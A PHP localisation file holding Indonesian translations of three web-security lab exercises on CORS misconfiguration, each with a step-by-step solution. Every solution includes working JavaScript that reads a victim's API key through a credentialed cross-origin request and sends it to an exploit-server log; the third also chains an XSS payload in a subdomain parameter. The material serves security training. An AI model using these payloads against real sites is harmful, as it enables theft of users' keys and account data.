<?php

return [
    '3c3123251c8faea3353dafdf70678f6d9241bbcdda2f8772ce17fb4dee20ca0d' => [
        'title' => 'Kerentanan CORS dengan refleksi origin dasar',
        'descriptionHtml' => <<<'LABHTML'
<p>
           	Situs web ini memiliki konfigurasi CORS yang tidak aman karena memercayai semua origin.
		</p><p>
            Untuk menyelesaikan lab ini, buat kode JavaScript yang memanfaatkan CORS untuk mengambil API key administrator dan unggah kode tersebut ke exploit server. Lab selesai saat Anda berhasil mengirimkan API key administrator.
        </p><p>
            Anda dapat masuk ke akun Anda menggunakan kredensial berikut: <code>wiener:peter</code>
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Pastikan intercept dalam kondisi mati, lalu gunakan browser untuk masuk dan membuka halaman akun Anda.
                    </li>
                    <li>
                        Periksa riwayat lalu lintas dan amati bahwa key Anda diambil melalui permintaan AJAX ke <code>/accountDetails</code>, serta respons menyertakan header <code>Access-Control-Allow-Credentials</code> yang menandakan dukungan CORS.
                    </li>
                    <li>
                        <p>
                            Kirim permintaan tersebut ke Burp Repeater, lalu kirim ulang dengan menambahkan header:
                        </p>
                        <code class="code-scrollable">Origin: https://example.com</code>
                    </li>
                    <li>
                        Amati bahwa origin tersebut dipantulkan dalam header <code no-keyword-injection="">Access-Control-Allow-Origin</code>.
                    </li>
                    <li>
                        <p>
                            Di browser, buka exploit server dan masukkan HTML berikut, ganti <code>YOUR-LAB-ID</code> dengan URL unik lab Anda:
                        </p>
                        <code class="code-scrollable">&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
&lt;/script&gt;</code>
                    </li>
                    <li>
                        Klik <strong>View exploit</strong>. Pastikan eksploit berjalan dan Anda diarahkan ke halaman log dengan API key Anda tercantum di URL.
                    </li>
                    <li>
                        Kembali ke exploit server dan klik <strong>Deliver exploit to victim</strong>.
                    </li>
                    <li>
                        Klik <strong>Access log</strong>, ambil lalu kirimkan API key korban untuk menyelesaikan lab.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '9d294029d336d1a8cefb9d84577fc92304467e91f4f9918e74b50be2c561db79' => [
        'title' => 'Kerentanan CORS dengan origin null terpercaya',
        'descriptionHtml' => <<<'LABHTML'
<p>
           	Situs web ini memiliki konfigurasi CORS yang tidak aman karena memercayai origin "null".
		</p><p>
            Untuk menyelesaikan lab ini, buat kode JavaScript yang memanfaatkan CORS untuk mengambil API key administrator dan unggah kode tersebut ke exploit server. Lab selesai saat Anda berhasil mengirimkan API key administrator.
        </p><p>
            Anda dapat masuk ke akun Anda menggunakan kredensial berikut: <code>wiener:peter</code>
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Pastikan intercept mati, lalu gunakan browser Burp untuk masuk ke akun Anda. Klik "My account".
                    </li>
                    <li>
                        Periksa riwayat lalu lintas dan amati bahwa key Anda diambil lewat permintaan AJAX ke <code>/accountDetails</code>, sementara respons memiliki header <code>Access-Control-Allow-Credentials</code> yang menandakan dukungan CORS.
                    </li>
                    <li>
                        Kirim permintaan ke Burp Repeater, lalu kirim ulang dengan menambahkan header <code>Origin: null.</code>
                    </li>
                    <li>
                        Amati bahwa origin "null" dipantulkan di header <code>Access-Control-Allow-Origin</code>.
                    </li>
                    <li>
                        <p>
                            Di browser, buka exploit server dan masukkan HTML berikut, ganti <code>YOUR-LAB-ID</code> dengan URL unik lab Anda dan <code>YOUR-EXPLOIT-SERVER-ID</code> dengan ID exploit server:
                        </p>
                        <code class="code-scrollable">&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</code>
                        <p>
                            Perhatikan pemakaian iframe sandbox karena hal ini menghasilkan permintaan ber-origin null.
                        </p>
                    </li>
                    <li>
                        Klik "View exploit". Pastikan eksploit bekerja dan Anda masuk ke halaman log dengan API key di URL.
                    </li>
                    <li>
                        Kembali ke exploit server dan klik "Deliver exploit to victim".
                    </li>
                    <li>
                        Klik "Access log", ambil lalu kirimkan API key korban untuk menyelesaikan lab.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    'c2f3d400e6fb00bebe61e8dca6a98b25a66613b18da83b2279298634c46d7f8e' => [
        'title' => 'Kerentanan CORS yang memercayai protokol tidak aman',
        'descriptionHtml' => <<<'LABHTML'
<p>
           	Situs web ini memiliki konfigurasi CORS yang tidak aman karena memercayai semua subdomain tanpa memeriksa protokolnya.
		</p><p>
            Untuk menyelesaikan lab ini, buat kode JavaScript yang memanfaatkan CORS untuk mengambil API key administrator dan unggah kode tersebut ke exploit server. Lab selesai saat Anda berhasil mengirimkan API key administrator.
        </p><p>
            Anda dapat masuk ke akun Anda menggunakan kredensial berikut: <code>wiener:peter</code>
        </p><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Jika Anda bisa melakukan serangan man-in-the-middle (MITM) terhadap korban, Anda dapat membajak koneksi ke subdomain tidak aman lalu menyuntikkan JavaScript berbahaya untuk mengeksploitasi konfigurasi CORS. Sayangnya di lingkungan lab Anda tidak dapat melakukan MITM pada korban, jadi temukan cara alternatif untuk menyuntikkan JavaScript ke subdomain tersebut.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Jika Anda bisa melakukan serangan man-in-the-middle (MITM) terhadap korban, Anda dapat membajak koneksi ke subdomain tidak aman lalu menyuntikkan JavaScript berbahaya untuk mengeksploitasi konfigurasi CORS. Sayangnya di lingkungan lab Anda tidak dapat melakukan MITM pada korban, jadi temukan cara alternatif untuk menyuntikkan JavaScript ke subdomain tersebut.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Pastikan intercept mati, lalu gunakan browser Burp untuk masuk dan membuka halaman akun Anda.
                    </li>
                    <li>
                        Periksa riwayat lalu lintas dan amati bahwa key Anda diambil melalui permintaan AJAX ke <code>/accountDetails</code>, sementara respons memiliki header <code>Access-Control-Allow-Credentials</code> yang menandakan dukungan CORS.
                    </li>
                    <li>
                        Kirim permintaan ke Burp Repeater, lalu kirim ulang dengan header <code>Origin: http://subdomain.lab-id</code> dengan <code>lab-id</code> adalah nama domain lab.
                    </li>
                    <li>
                        Amati bahwa origin dipantulkan di header <code>Access-Control-Allow-Origin</code>, memastikan konfigurasi CORS mengizinkan akses dari subdomain mana pun baik HTTPS maupun HTTP.
                    </li>
                    <li>
                        Buka halaman produk, klik <strong>Check stock</strong>, dan amati bahwa endpoint dimuat memakai URL HTTP pada sebuah subdomain.
                    </li>
                    <li>
                        Amati bahwa parameter <code>productID</code> rentan terhadap XSS.
                    </li>
                    <li>
                        <p>
                            Di browser, buka exploit server dan masukkan HTML berikut, ganti <code>YOUR-LAB-ID</code> dengan URL unik lab dan <code>YOUR-EXPLOIT-SERVER-ID</code> dengan ID exploit server:
                        </p>
                        <code class="code-scrollable">&lt;script&gt;
    document.location=&quot;http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1&quot;
&lt;/script&gt;</code>
                    </li>
                    <li>
                        Klik <strong>View exploit</strong>. Pastikan eksploit bekerja dan Anda masuk ke halaman log dengan API key di URL.
                    </li>
                    <li>
                        Kembali ke exploit server dan klik <strong>Deliver exploit to victim</strong>.
                    </li>
                    <li>
                        Klik <strong>Access log</strong>, ambil lalu kirimkan API key korban untuk menyelesaikan lab.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
];
